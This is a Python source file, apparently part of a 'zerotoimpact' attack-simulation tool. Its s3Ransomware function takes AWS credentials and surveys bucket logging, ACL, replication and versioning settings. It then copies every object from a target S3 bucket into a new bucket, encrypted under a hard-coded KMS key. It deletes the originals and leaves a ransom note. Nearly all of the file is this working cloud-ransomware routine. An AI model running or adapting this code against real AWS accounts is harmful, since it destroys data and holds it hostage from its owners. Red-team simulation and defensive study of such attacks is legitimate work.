import boto3
import botocore
import time
import lib.sanitize

def s3Ransomware(id, key, secret, origin_bucket_name, exchange,  logs, resources): 

    s3 = boto3.resource('s3', aws_access_key_id =key, aws_secret_access_key = secret)
    client = boto3.client('s3', aws_access_key_id =key, aws_secret_access_key = secret)
    
    destination_bucket_name = f"zti-bucket-destination-ransomware-{id}"
    destination_bucket_name = lib.sanitize.sanitize_bucket_name(destination_bucket_name)
    
    try:
        response = client.create_bucket(Bucket=destination_bucket_name)
        exchange.append({"operation" : "create s3 bucket", "response": response})
        resources['buckets'].append(destination_bucket_name)
        logs.append(f"Destination bucket {destination_bucket_name} created successfully.")
       
    except Exception as e:
        logs.append(f"Error creating bucket or uploading files: {e}")

    time.sleep(20)
    buckets = []
    try:
        response = client.list_buckets()
        for bucket in response['Buckets']:
            buckets.append(bucket)
    except botocore.exceptions.ClientError as error:
            logs.append(error.response)
            return

    for bucket in buckets:
        try:
            rsp = client.get_bucket_logging(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
            break

    for bucket in buckets:
        try:
            rsp = client.get_bucket_acl(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
            break

    for bucket in buckets:
        try:
            rsp = client.get_bucket_replication(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
            continue
    
    for bucket in buckets:
        try:
            rsp = client.get_bucket_versioning(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
              continue
     
    try:
        origin = s3.Bucket(origin_bucket_name)
        for obj in origin.objects.all():
            response = client.copy_object(Bucket=destination_bucket_name, 
                                                CopySource=f"{origin_bucket_name}/{obj.key}", Key = obj.key,
                                                ServerSideEncryption='aws:kms',SSEKMSKeyId='arn:aws:kms:us-east-1:607630831620:key/d2014bfa-bb53-45ea-a72c-334416939994')
    
            if response['ResponseMetadata']['HTTPStatusCode'] == 200:
                # Delete the object from the origin bucket
                origin.delete_objects(
                    Delete={
                        'Objects': [
                            {
                                'Key': obj.key
                            }
                        ]
                    }
                )
                logs.append(f"Successfully copied and deleted {obj.key}")
            else:
                logs.append(f"Copy succeeded but HTTP response not 200 for {obj.key}")

        final_file_content = 'thank you for using zerotoimpact policy_ransom_exploit attack scenario..'
        final_file_key = 'ransom-note.txt'
        client.put_object(Bucket=origin_bucket_name, Key=final_file_key, Body=final_file_content)
        logs.append(f"Added ransome note {final_file_key} to {origin_bucket_name}")
    except botocore.exceptions.ClientError as error:
        logs.append(error.response)



    

